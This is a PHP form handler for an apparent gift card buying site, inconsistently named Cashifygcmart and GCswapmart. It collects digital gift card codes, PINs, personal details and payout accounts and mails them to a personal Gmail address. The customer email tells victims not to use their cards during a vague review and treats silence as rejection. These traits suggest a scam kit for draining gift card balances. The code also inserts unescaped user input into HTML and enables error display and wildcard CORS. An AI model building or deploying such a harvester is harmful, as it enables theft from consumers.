<?php
// Error reporting for development (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit();
}

// Email Configuration - Updated to use standard PHP mail()
$operations_email = 'marketingmanager3059@gmail.com';
$from_email = 'noreply@cashifygcmart.com';
$from_name = 'CashifyGCmart';

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid JSON data']);
    exit();
}

// Validate required fields
$required_fields = ['firstName', 'lastName', 'email', 'phoneNumber', 'cards', 'paymentMethod'];
foreach ($required_fields as $field) {
    if (!isset($data[$field]) || empty($data[$field])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => "Missing required field: $field"]);
        exit();
    }
}

// Generate reference number
function generate_reference_number() {
    $timestamp = date('His');
    $random_num = rand(10, 99);
    return "GC-{$timestamp}-{$random_num}";
}

// Email template functions
function generate_confirmation_email_html($customer_name, $reference_number) {
    return "
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Thank You for Your Submission</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333333;
            background-color: #f5f7fa;
            padding: 20px 0;
        }
        .email-container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }
        .header {
            background: linear-gradient(135deg, #e91e63 0%, #9c27b0 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -1px;
        }
        .tagline {
            font-size: 14px;
            opacity: 0.9;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 25px;
        }
        .header-title {
            font-size: 28px;
            font-weight: 600;
            margin-top: 10px;
        }
        .content {
            padding: 40px 30px;
        }
        .greeting {
            font-size: 24px;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 15px;
        }
        .reference {
            font-size: 20px;
            font-weight: 600;
            color: #2980b9;
            margin-bottom: 30px;
        }
        .intro-text {
            font-size: 16px;
            color: #5d6d7e;
            margin-bottom: 35px;
            line-height: 1.7;
        }
        .section {
            margin-bottom: 35px;
        }
        .section-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        .section-icon {
            font-size: 20px;
            margin-right: 10px;
        }
        .section-title {
            font-size: 20px;
            font-weight: 600;
            color: #2c3e50;
        }
        .section-content {
            font-size: 15px;
            color: #5d6d7e;
            line-height: 1.7;
            margin-left: 30px;
        }
        .next-steps-item {
            margin-bottom: 20px;
        }
        .next-steps-label {
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 5px;
        }
        .important-box {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border-left: 4px solid #f39c12;
            padding: 20px;
            border-radius: 8px;
            margin: 25px 0;
        }
        .important-title {
            font-weight: 600;
            color: #d68910;
            margin-bottom: 8px;
        }
        .guidelines {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 12px;
            margin: 25px 0;
        }
        .guidelines-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .guidelines-title {
            font-size: 18px;
            font-weight: 600;
            color: #2c3e50;
        }
        .guidelines-grid {
            display: grid;
            gap: 12px;
        }
        .guideline-item {
            display: grid;
            grid-template-columns: 120px 1fr;
            font-size: 14px;
        }
        .guideline-label {
            font-weight: 600;
            color: #2c3e50;
        }
        .guideline-value {
            color: #5d6d7e;
        }
        .disclaimer-box {
            background: #ecf0f1;
            border-left: 4px solid #95a5a6;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
        .signature-section {
            margin: 40px 0 30px 0;
        }
        .signature-name {
            font-size: 20px;
            font-weight: 600;
            color: #2c3e50;
            text-align: center;
            margin-bottom: 5px;
        }
        .signature-title {
            font-size: 14px;
            color: #7f8c8d;
            text-align: center;
        }
        .contact-section {
            display: grid;
            gap: 15px;
            margin: 30px 0;
        }
        .contact-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        .contact-label {
            font-size: 12px;
            text-transform: uppercase;
            color: #95a5a6;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        .contact-value {
            font-size: 16px;
            font-weight: 600;
            color: #2c3e50;
        }
        .trust-badges {
            background: linear-gradient(135deg, #e8f5e8 0%, #d5f4d5 100%);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 25px 0;
        }
        .trust-text {
            font-size: 13px;
            color: #27ae60;
            font-weight: 500;
        }
        .footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid #ecf0f1;
            font-size: 12px;
            color: #95a5a6;
        }
        .footer-links {
            margin: 10px 0;
        }
        .footer-links a {
            color: #7f8c8d;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class=\"email-container\">
        <div class=\"header\">
            <div class=\"logo\">Cashifygcmart</div>
            <div class=\"tagline\">INSTANT OFFERS, SAME-DAY PAYMENTS</div>
            <div class=\"header-title\">Thank You for Your Submission</div>
        </div>
        <div class=\"content\">
            <div class=\"greeting\">Thank You for Your Submission, {$customer_name}</div>
            <div class=\"reference\">Reference Number: {$reference_number}</div>
            
            <div class=\"intro-text\">
                Thank you for submitting your gift card details to Cashifygcmart. Below is an update on the current status of your submission.
            </div>
            
            <div class=\"section\">
                <div class=\"section-header\">
                    <div class=\"section-icon\">📋</div>
                    <div class=\"section-title\">Current Status</div>
                </div>
                <div class=\"section-content\">
                    Our team is currently reviewing the gift card details you provided. This process ensures all submissions meet our standards for accuracy and authenticity. Your cooperation helps us maintain the trust and quality our customers rely on.
                </div>
            </div>
            
            <div class=\"section\">
                <div class=\"section-header\">
                    <div class=\"section-icon\">📌</div>
                    <div class=\"section-title\">Next Steps</div>
                </div>
                <div class=\"section-content\">
                    <div class=\"next-steps-item\">
                        <div class=\"next-steps-label\">Notification Timeline:</div>
                        <div>You will receive an update within 14 hours. Please check your inbox and spam/junk folders.</div>
                    </div>
                    <div class=\"next-steps-item\">
                        <div class=\"next-steps-label\">If Approved:</div>
                        <div>We'll provide redemption details and timelines in the follow-up email.</div>
                    </div>
                    <div class=\"next-steps-item\">
                        <div class=\"next-steps-label\">If Not Approved:</div>
                        <div>If no response is received within 8 hours, it may indicate your submission wasn't approved. Contact us for clarification.</div>
                    </div>
                </div>
            </div>
            
            <div class=\"important-box\">
                <div class=\"important-title\">Important:</div>
                <div>Do not use your gift card during the review period to avoid processing issues.</div>
            </div>
            
            <div class=\"guidelines\">
                <div class=\"guidelines-header\">
                    <div class=\"section-icon\">📝</div>
                    <div class=\"guidelines-title\">Gift Card Submission Guidelines</div>
                </div>
                <div class=\"guidelines-grid\">
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Eligible Cards:</div>
                        <div class=\"guideline-value\">Only those listed in our Rate Calculator.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Minimum Value:</div>
                        <div class=\"guideline-value\">$50 per card.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Processing Times:</div>
                        <div class=\"guideline-value\">Vary based on demand and market conditions.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Sundays:</div>
                        <div class=\"guideline-value\">Submissions are processed on the next business day.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">After 8 PM EST:</div>
                        <div class=\"guideline-value\">Processed the following day.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Payment Methods:</div>
                        <div class=\"guideline-value\">May be updated based on transaction success.</div>
                    </div>
                    <div class=\"guideline-item\">
                        <div class=\"guideline-label\">Unlisted Cards:</div>
                        <div class=\"guideline-value\">Contact support before submission.</div>
                    </div>
                </div>
                
                <div class=\"disclaimer-box\">
                    <strong>Disclaimer:</strong> Cashifygcmart is not responsible for balance discrepancies on unlisted cards.
                </div>
            </div>
            
            <p style=\"margin: 30px 0; font-size: 16px; color: #5d6d7e;\">
                Thank you again for choosing Cashifygcmart. Our support team is always here to help.
            </p>
            
            <div style=\"text-align: left; margin: 30px 0;\">
                <div style=\"font-size: 16px; color: #5d6d7e; margin-bottom: 10px;\">Best regards,</div>
            </div>
            
            <div class=\"signature-section\">
                <div class=\"signature-name\">Robert Smith</div>
                <div class=\"signature-title\">Customer Support Manager, Cashifygcmart</div>
            </div>
            
            <div class=\"contact-section\">
                <div class=\"contact-item\">
                    <div class=\"contact-label\">EMAIL SUPPORT</div>
                    <div class=\"contact-value\">support@cashifygcmart.com</div>
                </div>
                <div class=\"contact-item\">
                    <div class=\"contact-label\">PHONE SUPPORT</div>
                    <div class=\"contact-value\">(555) 013-2099</div>
                </div>
                <div class=\"contact-item\">
                    <div class=\"contact-label\">WEBSITE</div>
                    <div class=\"contact-value\">cashifygcmart.com</div>
                </div>
            </div>
            
            <div class=\"trust-badges\">
                <div class=\"trust-text\">SSL Secured • Same-Day Payouts • No Hidden Fees • 230+ Vendors Trusted</div>
            </div>
        </div>
        
        <div class=\"footer\">
            <div>2099 Harborview Drive, Suite 210, San Diego, CA 92101</div>
            <div class=\"footer-links\">
                <a href=\"#\">Rate Calculator</a> | 
                <a href=\"#\">FAQs</a> | 
                <a href=\"#\">Privacy Policy</a> | 
                <a href=\"#\">Terms of Service</a>
            </div>
            <div>© 2025 Cashifygcmart. All rights reserved.</div>
        </div>
    </div>
</body>
</html>";
}

function generate_internal_notification_email($customer_name, $reference_number, $submission_data) {
    $cards_info = "";
    $total_value = 0;
    
    foreach ($submission_data['cards'] as $index => $card) {
        $card_value = floatval($card['value'] ?? 0);
        $total_value += $card_value;
        
        $cards_info .= "Card " . ($index + 1) . ": " . ($card['brand'] ?? 'N/A') . 
                      " - Value: $" . ($card['value'] ?? '0') . 
                      " - Condition: " . ucwords(str_replace('-', ' ', $card['condition'] ?? 'N/A')) . 
                      " - Receipt: " . (($card['hasReceipt'] ?? 'no') === 'yes' ? 'Yes' : 'No') . 
                      " - Type: " . ucwords($card['cardType'] ?? 'N/A') . "\n";
        
        if (($card['cardType'] ?? '') === 'digital') {
            $cards_info .= "Digital Code: " . ($card['digitalCode'] ?? 'N/A') . "\n";
            $cards_info .= "Digital PIN: " . ($card['digitalPin'] ?? 'Not provided') . "\n";
        }
    }
    
    $payment_method = strtoupper($submission_data['paymentMethod'] ?? '');
    $payment_details = "";
    switch ($payment_method) {
        case 'PAYPAL':
            $payment_details = "PayPal: " . ($submission_data['paypalAddress'] ?? 'Not provided');
            break;
        case 'ZELLE':
            $payment_details = "Zelle: " . ($submission_data['zelleDetails'] ?? 'Not provided');
            break;
        case 'CASHAPP':
            $payment_details = "Cash App: " . ($submission_data['cashAppTag'] ?? 'Not provided');
            break;
        case 'BTC':
            $payment_details = "Bitcoin: " . ($submission_data['btcAddress'] ?? 'Not provided');
            break;
        case 'CHIME':
            $payment_details = "Chime: " . ($submission_data['chimeDetails'] ?? 'Not provided');
            break;
    }
    
    return "
<!DOCTYPE html>
<html>
<head>
    <meta charset=\"UTF-8\">
    <title>New GCswapmart Submission - {$reference_number}</title>
</head>
<body style=\"font-family: Arial, sans-serif; padding: 20px; background-color: #f5f5f5;\">
    <div style=\"max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px;\">
        <h2 style=\"color: #1f2937; margin-top: 0;\">New GCswapmart Submission</h2>
        
        <div style=\"background: #e5e7eb; padding: 15px; border-radius: 5px; margin: 20px 0;\">
            <strong>Reference Number:</strong> {$reference_number}
        </div>
        
        <h3 style=\"color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;\">Customer Information</h3>
        <p><strong>Name:</strong> {$customer_name}</p>
        <p><strong>Email:</strong> " . ($submission_data['email'] ?? 'N/A') . "</p>
        <p><strong>Phone:</strong> " . ($submission_data['phoneNumber'] ?? 'N/A') . "</p>
        <p><strong>Payment Method:</strong> {$payment_details}</p>
        
        <h3 style=\"color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;\">Gift Card Details</h3>
        <div style=\"background: #f9fafb; padding: 15px; border-radius: 5px; white-space: pre-line;\">
{$cards_info}
        </div>
        
        <div style=\"background: #fef3c7; border: 1px solid #f59e0b; padding: 15px; margin: 20px 0; border-radius: 5px;\">
            <strong>Total Value:</strong> $" . number_format($total_value, 2) . "
        </div>
        
        <p style=\"font-size: 12px; color: #6b7280;\">
            Submission Date: " . date('Y-m-d H:i:s') . "<br>
            System: GCswapmart Internal Notification
        </p>
    </div>
</body>
</html>";
}

// Send email function - Simplified for better compatibility
function send_email($to, $subject, $html_body, $from_email, $from_name) {
    // Email headers for HTML email
    $headers = array();
    $headers[] = 'MIME-Version: 1.0';
    $headers[] = 'Content-type: text/html; charset=UTF-8';
    $headers[] = "From: {$from_name} <{$from_email}>";
    $headers[] = "Reply-To: {$from_email}";
    $headers[] = "X-Mailer: PHP/" . phpversion();
    
    // Convert headers array to string
    $header_string = implode("\r\n", $headers);
    
    // Send email using PHP's built-in mail() function
    $success = mail($to, $subject, $html_body, $header_string);
    
    return $success;
}

// Process the submission
try {
    $reference_number = generate_reference_number();
    $customer_name = trim($data['firstName']) . ' ' . trim($data['lastName']);
    
    // Send confirmation email to customer
    $customer_email_sent = false;
    $customer_subject = "GCswapmart Submission Status Update - Reference #{$reference_number}";
    $customer_html = generate_confirmation_email_html($customer_name, $reference_number);
    
    try {
        $customer_email_sent = send_email(
            $data['email'], 
            $customer_subject, 
            $customer_html, 
            $from_email, 
            $from_name
        );
    } catch (Exception $e) {
        error_log("Customer email failed: " . $e->getMessage());
    }
    
    // Send internal notification
    $internal_email_sent = false;
    $internal_subject = "NEW GCswapmart Submission - Reference {$reference_number} - {$customer_name}";
    $internal_html = generate_internal_notification_email($customer_name, $reference_number, $data);
    
    try {
        $internal_email_sent = send_email(
            $operations_email, 
            $internal_subject, 
            $internal_html, 
            $from_email, 
            $from_name
        );
    } catch (Exception $e) {
        error_log("Internal email failed: " . $e->getMessage());
    }
    
    // Return success response
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'reference_number' => $reference_number,
        'message' => 'Gift card submission received successfully',
        'customer_email_sent' => $customer_email_sent,
        'internal_email_sent' => $internal_email_sent
    ]);
    
} catch (Exception $e) {
    error_log("Submission processing failed: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'Submission failed: ' . $e->getMessage()
    ]);
}
?>